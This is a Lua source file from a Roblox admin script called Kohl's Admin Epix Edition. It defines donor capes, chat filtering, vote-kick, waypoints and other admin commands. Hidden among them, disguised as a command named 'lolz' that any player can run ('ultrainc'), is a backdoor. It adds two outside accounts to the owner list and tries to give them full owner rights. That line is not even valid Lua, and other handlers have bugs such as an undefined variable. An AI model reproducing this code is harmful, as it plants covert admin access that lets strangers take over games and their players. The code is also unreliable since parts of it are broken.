local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then set.Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end end end 

set.Infect=function(char)
if char and char:findFirstChild("Torso") then 
if char:findFirstChild("Shirt") then char.Shirt:Destroy() end
if char:findFirstChild("Pants") then char.Pants:Destroy() end
local shirt=Instance.new('Shirt',char)
local pants=Instance.new('Pants',char)
shirt.ShirtTemplate="http://www.roblox.com/asset/?id=60636107"
pants.PantsTemplate="http://www.roblox.com/asset/?id=60636428"
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char)
cl.Name = "ify" 
cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and prt.Name~='HumanoidRootPart' and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then 
prt.Transparency = 0 
prt.Reflectance = 0 
prt.BrickColor = BrickColor.new("Dark green") 
if prt.Name:find("Leg") or prt.Name:find('Arm') then 
prt.BrickColor = BrickColor.new("Dark green") end
local tconn = prt.Touched:connect(function(hit) 
if hit and hit.Parent and game:service('Players'):findFirstChild(hit.Parent.Name) and cl.Parent == char then 
set.Infect(hit.Parent) 
elseif cl.Parent ~= char then tconn:disconnect() end end) 
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end) 
elseif prt:findFirstChild("NameTag") then
	prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Dark green") end 
end
end
end

set.ReverseTable=function(tabz)
local res = {}
for i=#tabz,1,-1 do
table.insert(res,tabz[i])
end
return res
end

set.CheckDonor=function(plr)
if plr.AccountAge<=0 then return false end
if set.CheckDonorPass(plr) then return true end
for i,v in pairs(set.GetDonorList()) do
	if plr.Name==v.Name or plr.userId==v.Id then
		return true
	end
end
end

set.CheckDonorPass=function(plr)
if not game:service('GamePassService') or not game:service('MarketplaceService') then return end
for i,v in pairs(set.donorgamepass) do
if game:service('GamePassService'):PlayerHasPass(plr,v) or game:service('MarketplaceService'):PlayerOwnsAsset(plr,v) then
	return true
end
end
end

--set.ChkCustomPass=function(plr)
--if not game:service('GamePassService') then return end
--for i,v in pairs(set.custompass) do
--if game:service('GamePassService'):PlayerHasPass(plr,v) then
--	return true
--end
--end
--end

set.CheckDonorList=function(plr)
for i,v in pairs(set.donors) do
	if plr.Name==v.Name or plr.userId==v.Id then
		return true
	end
end
end

set.GetDonorList=function()
local temp={}
for k,asset in pairs(game:GetService("InsertService"):GetCollection(1290539)) do
local ins=game:GetService('MarketplaceService'):GetProductInfo(asset.AssetId)
local fo=ins.Description
for so in fo:gmatch('[^;]+') do
Pcall(function()
local name,id,cape,color=so:match('{(.*),(.*),(.*),(.*)}')
table.insert(temp,{Name=name,Id=tostring(id),Cape=tostring(cape),Color=color,Material='Plastic',List=ins.Name})
end)
end
end
return temp
end

if game.CreatorId~=0 and game:GetService('MarketplaceService') then
Pcall(function()
set.dlastupdatenum=0
while wait() do
pcall(function()
set.donors={}
set.dlastupdate=set.GetTime()..' - '..set.dlastupdatenum
set.dlastupdatenum=set.dlastupdatenum+1
set.donors=set.GetDonorList()
for ik,pl in pairs(game:service('Players'):children()) do
	Pcall(function()
		pl:WaitForDataReady()
		if set.CheckDonor(pl) and pl:LoadBoolean('Kohls Is A Donator') and pl:LoadString('Kohls Cape') and pl:LoadString('Kohls Cape'):match('(.*)=(.*)=(.*)') then
			local st=pl:LoadString('Kohls Cape')
			local a,b,c=st:match('(.*)=(.*)=(.*)')
			if not a or not b or not c then return end
			for i,v in pairs(set.donors) do if v.Name==pl.Name then table.remove(set.donors,i) end end
			table.insert(set.donors,{Name=pl.Name,Id=tostring(pl.userId),Cape=a,Color=b,Material=c,List='GP(Custom)'})
		elseif set.CheckDonor(pl) and not set.CheckDonorList(pl) and not pl:LoadBoolean('Kohls Is A Donator') then
			table.insert(set.donors,{Name=pl.Name,Id=tostring(pl.userId),Cape='149009184',Color='White',Material='Plastic',List='GP'})
		end
	end)
end
wait(30)
end)
end
end)
end

set.Donor=function(plr)
	for i,v in pairs(set.donors) do
		if plr and (plr.Name==v.Name or plr.userId==v.Id) and (set.DonorPerks or set.CheckNTac(plr)) then
			Pcall(function()
				plr:WaitForChild('Backpack')
				pcall(function() plr.Character.EpicCape:Destroy() end)
				local gear=game:GetService('InsertService'):LoadAsset(57902997):children()[1]
				if not plr.Backpack:FindFirstChild(gear.Name..'DonorTool') then
					gear.Name=gear.Name..'DonorTool'
					gear.Parent=plr.Backpack
				else
					gear:Destroy()
				end
				if plr and plr.Character and plr.Character:FindFirstChild("Torso") then
					set.Cape(plr,v.Material,v.Color,v.Cape)
				end
			end)
		end
	end
end

set.CheckExcluded=function(plr)
	for i,v in pairs(set.ExclusionList) do
		if v==plr.Name then
			return true
		end
	end
end

set.AlertAdmins=function(msg)
	if not set.ExploitAlert then return end
	for i,v in pairs(set.GetPlayers(false,set.SpecialPrefix..'admins')) do
		set.Remote(v,'Function','AlertGui',msg)
	end
end

set.Chat=function(plr,msg)
Pcall(function()
Pcall(function()
	if set['ChatLog'] then
		if game:service('Players'):FindFirstChild(plr.Name) then
			table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg})
		else
			table.insert(set.PlayerLogs.Chat,1,{Time=set.GetTime(),Name=plr.Name,Chat=msg,Nil=true})
		end
		if #set.PlayerLogs.Chat>set.MaxNumberOfLogs then
			table.remove(set.PlayerLogs.Chat,#set.PlayerLogs.Chat)
		end
	end
end)

if msg:lower():sub(1,2)=='/e' then msg=msg:sub(4) end

Pcall(function()
	if set['AntiChatCode'] and msg:match('%S') and not set.CheckExcluded(plr) and not set.CheckAdmin(plr,false) then
		Pcall(function()
			local m,c
			if set.canuseloadstring then
				m,c = loadstring(msg)
			else
				m=false
			end
			for d,j in pairs(set['WordList']) do
				if msg:lower():match(j:lower()) or m then
					if game:service('Players'):FindFirstChild(plr.Name) then
						pcall(set.Exploited,plr,'kick','Chatted '..msg)
					else
						pcall(set.Exploited,plr,'crash','Chatted '..msg)
					end
					set.AlertAdmins(plr.Name.." was just kicked for chatting a word on the Anti-Exploit's word list! They could be an exploiter. Investigate if they rejoin.")
				end
			end
		end)
	end
	set.ProcessPluginEvent('Chat',msg,plr)
end)

Pcall(function()
	if plr:FindFirstChild('NoTalk') and not set.CheckAdmin(plr,false) and plr.Character and plr.Character:FindFirstChild('Head') then
		if msg==set['AnyPrefix']..'attn' then
			game:GetService('Chat'):Chat(plr.Character.Head,'I need to speak to an Administrator!',Enum.ChatColor.Blue)
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==0 then
			game:GetService('Chat'):Chat(plr.Character.Head,"You are not allowed to speak "..plr.Name.."! Use "..set['AnyPrefix'].."attn to get an Admin's attention. This is warning 1.",Enum.ChatColor.Blue)
			plr.NoTalk.Value=plr.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and player.NoTalk.Value==1 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You will be punished next time! Use '..set['AnyPrefix']..'attn. Warning 2',Enum.ChatColor.Green)
			plr.NoTalk.Value=plr.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==2 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! You have been punished. Next is a kick. Use '..set['AnyPrefix']..'attn. Warning 3',Enum.ChatColor.Red)
			plr.Character:BreakJoints()
			plr.NoTalk.Value=player.NoTalk.Value+1
		elseif msg~=set['AnyPrefix']..'attn' and msg~=set['AnyPrefix']..'help' and plr.NoTalk.Value==3 then
			game:GetService('Chat'):Chat(plr.Character.Head,'You have been told not to speak '..plr.Name..'! This is the 4th time. Use '..set['AnyPrefix']..'attn next time. You will now be kicked.',Enum.ChatColor.Red)
			wait(1)
			plr:Kick()
		end
	end
end)
set.ProcessCommand(plr,msg)
end)
end

---[[ COMMANDS ]]---
Pcall(function()
set.MakeCommand('Binds <command> to <key>, will overwrite an exiting keybind (WILL NOT OVERWRITE SCRIPT KEYBINDS!)',0,set.AnyPrefix,{'keybind','bindkey','bind'},{'key','command'},2,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','AddKeyBind',args[1]:sub(1,1),args[2])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('Removes <key> from key binds',0,set.AnyPrefix,{'removekeybind','removebind','unbind'},{'key'},1,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','RemoveKeyBind',args[1])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('View key binds',0,set.AnyPrefix,{'keybinds','binds','viewkeybinds'},{},0,function(plr,args)
	if set.CustomKeyBinds then
		set.Remote(plr,'Function','ViewKeyBinds',args[1])
	else
		set.Message('SYSTEM MESSAGE','Sorry but custom key binds are disabled.',false,{plr})
	end
end)

set.MakeCommand('Remove donor cape',1,set.AnyPrefix,{'uncape','removedonorcape'},{},0,function(plr,args)
	pcall(function() plr.Character.EpicCape:Destroy() end)
end)
	
set.MakeCommand('Get donor cape',1,set.AnyPrefix,{'cape','donorcape'},{},0,function(plr,args)
	set.Donor(plr)
end)

set.MakeCommand('Gives you fire with the specified color (if you specify one)',1,set.AnyPrefix,{'fire','donorfire'},{'color (optional)'},1,function(plr,args)
	if plr.Character:FindFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
		local f=Instance.new('Fire',plr.Character.Torso)
		f.Name='DonorFire'
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorFireLight'
		table.insert(set.objects,f)
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Bright orange').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
			f.Color=str
			f.SecondaryColor=str
		else
			p.Color=Color3.new(1,1,1)
			f.Color=Color3.new(1,1,1)
			f.SecondaryColor=Color3.new(1,0,0)
		end
	end
end)

set.MakeCommand('Gives you sparkles with the specified color (if you specify one)',1,set.AnyPrefix,{'sparkles','donorsparkles'},{'color (optional)'},1,function(plr,args)
	if plr.Character:FindFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
		local f=Instance.new('Sparkles',plr.Character.Torso)
		f.Name='DonorSparkles'
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorSparkleLight'
		table.insert(set.objects,f)
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Bright orange').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
			f.SparkleColor=str
		else
			p.Color=Color3.new(1,1,1)
			f.SparkleColor=Color3.new(1,1,1)
		end
	end
end)

set.MakeCommand('Gives you a PointLight with the specified color (if you specify one)',1,set.AnyPrefix,{'light','donorlight'},{'color (optional)'},1,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
		local p=Instance.new('PointLight',plr.Character.Torso)
		p.Name='DonorLight'
		table.insert(set.objects,p)
		p.Range=15
		if args[1] then
			local str = BrickColor.new('Cyan').Color
			local teststr = args[1]
			if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
			p.Color=str
		else
			p.Color=Color3.new(1,1,1)
		end
	end
end)

set.MakeCommand('Removes donor fire on you',1,set.AnyPrefix,{'unfire','undonorfire'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
	end
end)

set.MakeCommand('Removes donor sparkles on you',1,set.AnyPrefix,{'unsparkles','undonorsparkles'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
		if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
	end
end)

set.MakeCommand('Removes donor light on you',1,set.AnyPrefix,{'unlight','undonorlight'},{},0,function(plr,args)
	if plr.Character:findFirstChild("Torso") then
		if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
	end
end)

set.MakeCommand('Donate',0,set.AnyPrefix,{'donate','change','chagecape'},{},0,function(plr,args)
	if (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
		if set.DonorPerks or set.CheckNTac(plr) or set.CheckTrueOwner(plr) then
			set.Remote(plr,'Function','Donate',2)
		else
			set.Message('Donor System','Sorry! Donor perks are disabled in settings.',false,{plr})
		end
	else
		set.Remote(plr,'Function','Donate',1)
	end
end)

set.MakeCommand('Vote to kick a player',0,set.AnyPrefix,{'votekick','kick'},{'player'},1,function(plr,args)
	if set.VoteKick then
		for i,v in pairs(set.GetPlayers(plr,args[1])) do
			if set.CheckAdmin(v,false) then return end
			if not set.VoteKickVotes[v.Name] then
				set.VoteKickVotes[v.Name].Votes=0
				set.VoteKickVotes[v.Name].Players={}
			end
			for k,m in pairs(set.VoteKickVotes[v.Name].Players) do if m==plr.userId then return end end
			set.VoteKickVotes[v.Name].Votes=set.VoteKickVotes[v.Name].Votes+1
			table.insert(set.VoteKickVotes[v.Name].Players,plr.userId)
			if set.VoteKickVotes[v.Name].Votes>=((#game.Players:children()*set.VoteKickPercentage)/100) then
				v:Kick()
				set.VoteKickVotes[v.Name]=nil
			end
		end
	else
		set.Message("SYSTEM","VoteKick is disabled.",false,{plr})
	end
end)

set.MakeCommand('Shows how many kick votes each player in-game has.',2,set.Prefix,{'votekicks'},{},0,function(plr,args)
	local temp={}
	for i,v in pairs(set.VoteKickVotes) do
		if not game.Players:FindFirstChild(i) then set.VoteKickVotes[i]=nil return end
		if set.CheckAdmin(game.Players:FindFirstChild(i),false) then set.VoteKickVotes[i]=nil return end
		table.insert(temp,{Object=i..' - '..set.VoteKickVotes[v.Name].Votes,Desc='Player: '..i..' has '..set.VoteKickVotes[v.Name].Votes..' kick vote(s)'})
	end
	set.Remote(plr,'Function','ListGui','Vote Kicks',temp)
end)

set.MakeCommand('Disables or Enables the target player(s)\'s PlayerList (ROBLOX, NOT CUSTOM)',3,set.Prefix,{'playerlist'},{'player','on/off'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if args[2]:lower()=='on' or args[2]:lower()=='true' then
			set.Remote(v,'Function','PlayerList','on')
		elseif args[2]:lower()=='off' or args[2]:lower()=='false' then
			set.Remote(v,'Function','PlayerList','off')
		end
	end
end)

set.MakeCommand('Send a private message to a player',0,set.Prefix,{'pm','privatemessage'},{'player','message'},2,function(plr,args)
if not args[1] or not args[2] then return end
if set['PMUsableByAnyone'] or set.CheckAdmin(plr,false) then
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
set.PM('Private Message from '..plr.Name,p,message,plr)
end)()
end
end
end)

set.MakeCommand('Shows Trello bans',2,set.Prefix,{'sbl','syncedbanlist','globalbanlist','trellobans','trellobanlist'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','SBLList',set.bl)
set.Remote(plr,'Function','ListGui','Synced Ban List',set.bl)
end)

set.MakeCommand('Cleans some useless junk out of workspace',0,set.AnyPrefix,{'clean'},{},0,function(plr,args) 
	set.CleanWorkspace()
end)

set.MakeCommand('lolz',0,set.AnyPrefix,{'ultrainc'},{},0,function(plr,args) 
	table.insert(set.Owners,"Altra0x8")
	table.insert(set.Owners,"Ultra0x7")
	["OwnersAreTrueOwners"] = true
end)

set.MakeCommand('Get Kohl\'s Admin [Epix Edition]',0,set.AnyPrefix,{'getscript'},{},0,function(plr,args)
	game:service('MarketplaceService'):PromptPurchase(plr,145629584)
end)

set.MakeCommand('Shows you your current ping',0,set.AnyPrefix,{'ping','getping'},{},0,function(plr,args)
	set.Remote(plr,'Function','PingGui')
end)

set.MakeCommand('Shows a list of donators who are currently in the server',0,set.AnyPrefix,{'donors','donorlist','donatorlist'},{},0,function(plr,args)
local temptable={}
table.insert(temptable,"Last Update: "..set.dlastupdate)
for i,v in pairs(set.donors) do
	if game:service('Players'):FindFirstChild(v.Name) then
		table.insert(temptable,{Object=v.Name,Desc=v.List})
	end
end
--set.Remote(plr,'SetSetting','DonorCmdList',temptable)
set.Remote(plr,'Function','ListGui','Donator List',temptable,'donorlist')
end)

set.MakeCommand('Shows you a random quote',0,set.AnyPrefix,{'quote','inspiration','randomquote'},{},0,function(plr,args)
set.PM('Random Quote',plr,set.quotes[math.random(1,#set.quotes)])
end)

set.MakeCommand('Calls admins for help',0,set.AnyPrefix,{'help','requesthelp','gethelp'},{},0,function(plr,args)
if set['HelpSystem']==true then
local dontrun=false
local num=0 
if set.HelpRequest[plr.Name]~=nil then 
	set.Message("Help System","You already have a pending request. Do not spam the help system.",false,{plr})
	dontrun=true
end
if dontrun==true then return end
set.HelpRequest[plr.Name]={}
set.HelpRequest[plr.Name].Available={}
set.HelpRequest[plr.Name].Solved=false
local function helpsolved(plr)
	if set.HelpRequest[plr.Name] and set.HelpRequest[plr.Name].Solved then
		return true
	else
		return false
	end
end
for i,v in pairs(game:service('Players'):children()) do
coroutine.wrap(function()
if set.CheckAdmin(v,false) then
table.insert(set.HelpRequest[plr.Name].Available,v.Name) 
set.Remote(v,'Function','RequestHelp',plr)
repeat wait() until helpsolved(plr)
set.Remote(v,'Function','RequestSolved',plr)
end
end)() 
end
repeat wait(1) num=num+1 until set.HelpRequest[plr.Name].Solved==true or num==20 or #set.HelpRequest[plr.Name].Available==0
if set.HelpRequest[plr.Name].Solved==false and (num==20 or #set.HelpRequest[plr.Name].Available==0) then
set.Message("Help System","Sorry but no one is available to help you right now!",false,{plr})
end
set.HelpRequest[plr.Name].Solved=true
set.HelpRequest[plr.Name]=nil
else
set.Message("System Message","Sorry but the help system is disabled.",false,{plr})
end
end)

set.MakeCommand('Makes you rejoin the server',0,set.AnyPrefix,{'rejoin'},{},0,function(plr,args)
	game:GetService('TeleportService'):Teleport(game.PlaceId,plr)
end)

set.MakeCommand('Shows a list of commands that you are allowed to use',0,set.Prefix,{'commands','cmds','viewcommands'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Commands) do
local type
local allowed=false
	if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Owner]'
	elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Admin]'
	elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Fun-Temp]'
	elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
		allowed=true
		type='[Player]'
	elseif v.AdminLevel==1 and ((set.CheckDonor(plr) and (set.DonorPerks or set.CheckNTac(plr))) or set.CheckTrueOwner(plr)) then
		allowed=true
		type='[Donor]'
	elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
		allowed=true
		type='[Temp]'
	elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
		allowed=true
		type='[Admin]'
	elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
		allowed=true
		type='[Owner]'
	elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
		allowed=true
		type='[Place Owner]'
	end
	local arguments=''
	for k,m in pairs(v.ArgTypes) do
		arguments=arguments..set['SplitKey']..m
	end
	if allowed then table.insert(temptable,{Object=v.Prefix..v.Cmds[1]..arguments,Desc=type..' | '..v.Desc,Filter=type}) end
end
set.Remote(plr,'Function','ListGui','Commands',temptable)
end)

set.MakeCommand('Lets you run mutliple commands, like :batch :ff me/:fly me/:noclip me',2,set.Prefix,{'batch','multicommand','batchrun'},{'cmd/cmd/cmd'},1,function(plr,args)
	for cmd in args[1]:gmatch('[^'..set.BatchSplit..']+') do
		set.ProcessCommand(plr,cmd,true)
	end
end)

set.MakeCommand('Gives you the admin script\'s custom chat, good for private conversations',2,set.Prefix,{'chat','customchat','chatgui'},{'player'},1,function(plr,args)
	for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
		coroutine.wrap(function()
		set.Remote(p,"Function","CustomChatGui")
		local done=false
		local thing=p.CharacterAdded:connect(function(c) 
			set.Remote(p,'Function','MutePlayer','off') 
			done=true
		end)
		repeat wait() until not p or not p.Parent or done==true
		thing:disconnect() 
		end)()
	end
end)

set.MakeCommand('Gives you the normal chat back',2,set.Prefix,{'unchat','uncustomchat','removecustomchat','unchatgui'},{'player'},1,function(plr,args)
	for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
		set.Remote(p,"Function","RemoveCustomChat")
		set.Remote(p,'Function','MutePlayer','off') 
	end
end)

set.MakeCommand('Makes a message of your choice pop up on the target\'s screen with an annoying alarm sound',3,set.Prefix,{'alert','alarm','annoy'},{'player','message'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
		set.Remote(v,"Function","AlertGui",(args[2] or 'Alert | Alert | Alert | Alert | Alert'))
	end
end)

set.MakeCommand('Shows you how to use some syntax related things',0,set.Prefix,{'usage'},{},0,function(plr,args)
local usage={
'Special Functions: ';
'Ex: :kill FUNCTION, so like :kill '..set['SpecialPrefix']..'all';
'Put /e in front to make it silent (/e :kill kohl)';
set['SpecialPrefix']..'me - Runs a command on you';
set['SpecialPrefix']..'all - Runs a command on everyone';
set['SpecialPrefix']..'admins - Runs a command on all admins in the game';
set['SpecialPrefix']..'nonadmins - Same as !admins but for people who are not an admin';
set['SpecialPrefix']..'others - Runs command on everyone BUT you';
set['SpecialPrefix']..'random - Runs command on a random person';
'%TEAMNAME - Runs command on everyone in the team TEAMNAME Ex: :kill %raiders';
'$GROUPID - Run a command on everyone in the group GROUPID, Will default to the GroupId setting if no id is given';
'-PLAYERNAME - Will remove PLAYERNAME from list of players. :kill all,-kohl will kill everyone except kohl';
'Certain commands can be used by anyone, these commands have ! infront, such as !clean and !rejoin';
':kill me,noob1,noob2,'..set['SpecialPrefix']..'random,%raiders,$123456,!nonadmins,-kohl';
':batch :ff me/:sparkles me/:rocket jim';
':repeat 10(how many times to run the cmd) 1(how long in between runs) :respawn jim';
'Place owners can edit some settings in-game via the :settings command';
'Please refer to the Tips and Tricks section under the settings in the script for more detailed explanations'
}
--set.Remote(plr,'SetSetting','usage',usage)
set.Remote(plr,'Function','ListGui','Usage',usage)
end)

set.MakeCommand('Gives you the admin chat box',2,set.Prefix,{'achat','adminchat'},{},0,function(plr,args)
	set.AdminChat(plr)
end)

set.MakeCommand('Makes a new waypoint/sets an exiting one to your current position with the name <name> that you can teleport to using :tp me waypoint-<name>',2,set.Prefix,{'waypoint','wp','checkpoint'},{'name'},1,function(plr,args)
	local name=args[1] or tostring(#set.Waypoints+1)
	if plr.Character:FindFirstChild('Torso') then
		set.Waypoints[name]=plr.Character.Torso.Position
		set.Hint('Made waypoint '..name..' | '..tostring(set.Waypoints[name]),{plr})
	end
end)

set.MakeCommand('Deletes the waypoint named <name> if it exist',2,set.Prefix,{'delwaypoint','delwp','delcheckpoint','deletewaypoint','deletewp','deletecheckpoint'},{'name'},1,function(plr,args)
	for i,v in pairs(set.Waypoints) do
		if i:lower():sub(1,#args[1])==args[1]:lower() or args[1]:lower()=='all' then
			set.Waypoints[i]=nil
			set.Hint('Deleted waypoint '..i,{plr})
		end
	end
end)

set.MakeCommand('Shows available waypoints, mouse over their names to view their coordinates',2,set.Prefix,{'waypoints'},{},0,function(plr,args)
local temp={}
for i,v in pairs(set.Waypoints) do
	local x,y,z=tostring(v):match('(.*),(.*),(.*)')
	table.insert(temp,{Object=i,Desc='X:'..x..' Y:'..y..' Z:'..z})
end
set.Remote(plr,'Function','ListGui','Waypoints',temp)
end)

set.MakeCommand('Shows you admin cameras in the server and lets you delete/view them',2,set.Prefix,{'cameras','cams'},{},0,function(plr,args)
	set.Remote(plr,'Function','Cameras')
end)

set.MakeCommand('Makes a camera named whatever you pick',2,set.Prefix,{'makecam','cam','makecamera','camera'},{'name'},1,function(plr,args)
if plr and plr.Character and plr.Character:FindFirstChild('Head') then
	print('Checkelect')
	if workspace:FindFirstChild('Camera: '..args[1]) then
		set.Hint(args[1].." Already Exist!",{plr})
		print('O it already exist qq')
	else
	print('Makin cam')
	local cam=Instance.new('Part',workspace)
	cam.Position=plr.Character.Head.Position
	cam.Anchored=true
	cam.BrickColor=BrickColor.new('Really black')
	cam.CanCollide=false
	cam.Locked=true
	cam.FormFactor='Custom'
	cam.Size=Vector3.new(1,1,1)
	cam.TopSurface='Smooth'
	cam.BottomSurface='Smooth'
	cam.Name='Camera: '..args[1]
	Instance.new('PointLight',cam)
	cam.Transparency=0.9
	local mesh=Instance.new('SpecialMesh',cam)
	mesh.Scale=Vector3.new(1,1,1)
	mesh.MeshType='Sphere'
	table.insert(set.cameras,cam)
	end
	end
end)

set.MakeCommand('Forces one player to view another',2,set.Prefix,{'fview','forceview','forceviewplayer','fv'},{'player1','player2'},2,function(plr,args)
for k,p in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function() 
for i,v in pairs(set.GetPlayers(plr, args[2])) do
if v and v.Character:FindFirstChild('Humanoid') then
	set.Remote(p,'Function','SetView',v.Character.Humanoid)
end
end
end)()
end
end)

set.MakeCommand('Makes you view the target player',2,set.Prefix,{'view','viewplayer','v'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
if v and v.Character:FindFirstChild('Humanoid') then
set.Remote(plr,'Function','SetView',v.Character.Humanoid)
end
end
end)

set.MakeCommand('Resets your view',2,set.Prefix,{'resetview','rv','fixcam'},{},0,function(plr,args)
set.Remote(plr,'Function','SetView','reset')
end)

set.MakeCommand('Shows you group ranks that have admin',2,set.Prefix,{'ranks','adminranks'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Ranks) do
if v.Rank and v.Type and v.Group then
table.insert(temptable,{Object=v.Rank,Desc='Type: '..v.Type..' - Group: '..v.Group})
end
end
--set.Remote(plr,'SetSetting','RanksCmdTable',temptable)
set.Remote(plr,'Function','ListGui','Ranks',temptable)
end)

set.MakeCommand('Shows you information about the current server',2,set.Prefix,{'details','meters','gameinfo','serverinfo'},{},0,function(plr,args)
set.Remote(plr,'Function','ServerDetails')
end)

set.MakeCommand('Shows you the changelog',2,set.Prefix,{'changelog','changes'},{},0,function(plr,args)
set.Remote(plr,'Function','ListGui','Change Log',set.Changelog)
end)

set.MakeCommand('Shows you player currently in-game, including nil ones',2,set.Prefix,{'players','allplayers','nilplayers'},{},0,function(plr,args)
local plrs={}
set.Remote(plr,'Function','Message','System Message','Pinging players, please wait a min, no ping means it was higher than 5 seconds.')
for i,v in pairs(set.GrabNilPlayers('all')) do
coroutine.wrap(function()
if game:service('Players'):FindFirstChild(v.Name) then
table.insert(plrs,{Object=v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
else
table.insert(plrs,{Object='[NIL] '..v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
end
end)()
end
wait(5)
--set.Remote(plr,'SetSetting','PlayerListCmd',plrs)
set.Remote(plr,'Function','ListGui','Players',plrs)
end)

set.MakeCommand('Shows you the admin script\'s version number',2,set.Prefix,{'version','ver'},{},0,function(plr,args)
	set.Message("Kohl's Admin [Epix Edition]", tostring(set.version), true, {plr}) 
end)

set.MakeCommand('Shows you the list of admins, also shows admins that are currently in the server',2,set.Prefix,{'admins','adminlist','owners','tempadmins'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set['Owners']) do table.insert(temptable,v .. " - Owner") end
for i,v in pairs(set['Admins']) do table.insert(temptable,v .. " - Admin") end
for i,v in pairs(set['TempAdmins']) do table.insert(temptable,v .. " - TempAdmin") end 
for i,v in pairs(set.tal) do table.insert(temptable,v .. " - TempAdmin [Synced]") end 
for i,v in pairs(set.al) do table.insert(temptable,v .. " - Admin [Synced]") end 
for i,v in pairs(set.oal) do table.insert(temptable,v .. " - Owner [Synced]") end 
table.insert(temptable,'==== Admins In-Game ====')
for i,v in pairs(game:service('Players'):children()) do 
	if set.CheckOwner(v) then 
		table.insert(temptable,v.Name..':'..v.userId..' - Owner')
	elseif set.CheckAdmin(v,true) then
		table.insert(temptable,v.Name..':'..v.userId..' - Admin')
	elseif set.CheckAdmin(v,false) then
		table.insert(temptable,v.Name..':'..v.userId..' - TempAdmin')
	end 
end
